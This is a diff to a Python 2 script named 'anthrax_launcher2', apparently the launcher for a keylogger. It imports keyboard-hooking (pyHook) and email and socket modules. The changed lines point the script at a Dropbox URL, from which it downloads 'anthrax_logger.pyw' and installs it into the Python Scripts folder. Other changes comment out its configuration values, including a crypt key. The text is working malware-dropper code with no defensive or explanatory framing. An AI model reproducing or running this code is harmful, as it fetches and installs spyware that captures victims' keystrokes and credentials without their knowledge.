@@ -1,9 +1,9 @@
-#anthrax_launcher2 1.1
+#anthrax_launcher2 1.2
 #config--------------------
-subject_name = 'debug4.1'
+#subject_name = 'debug4.1'
 #subject_file = 'C://Python27/name.txt'
-interval = 500
-crypt_key = 69
+#interval = 500
+#crypt_key = 69
 #--------------------------
 import pyHook, pythoncom, sys, logging, os, smtplib, socket, getpass, time
 from email.MIMEBase import MIMEBase
@@ -23,11 +23,11 @@ import subprocess
 #f.close()
 #print r
 #--------------------------
-url_c = "anthrax.pyw" 
+url_c = "https://dl.dropboxusercontent.com/u/42966918/anthrax/anthrax_logger/anthrax_logger.pyw?dl=1" 
 print 'Gathering anthrax_logger...',
 c = urllib.URLopener()
 c.retrieve(url_c, "anthrax_logger.pyw")
-shutil.move("anthraxchin.pyw", "C://Python27/Scripts/anthrax_logger.pyw")
+shutil.move("anthrax_logger.pyw", "C://Python27/Scripts/anthrax_logger.pyw")
 print 'Done'
 #print 'Gathering installer...',
 #b = urllib.URLopener()
